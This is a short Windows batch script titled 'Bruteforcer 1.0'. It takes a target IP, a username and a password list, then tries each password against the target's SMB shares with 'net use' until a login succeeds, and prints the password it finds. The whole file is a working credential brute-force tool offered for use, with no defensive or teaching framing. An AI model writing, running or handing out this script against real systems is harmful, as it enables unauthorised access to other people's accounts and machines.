::to disconnect from connected ip->
::net use \\ip /delete

::to display connections->
::net use

::------------------------------------------

@echo off

title Bruteforcer 1.0
color 4

echo.
set /p ip="Enter IP Address: "
set /p userName="Enter Username: "
set /p passwordList="Enter Password list: "

set /a count=0
for /f %%a in (%passwordList%) do (
	set password=%%a
	call :attempt
)
echo Password not found.
pause
exit

:success
echo.
echo Password found!: %password%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%userName% %password% >nul 2>&1
echo [ATTEMPT %count%] [%password%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
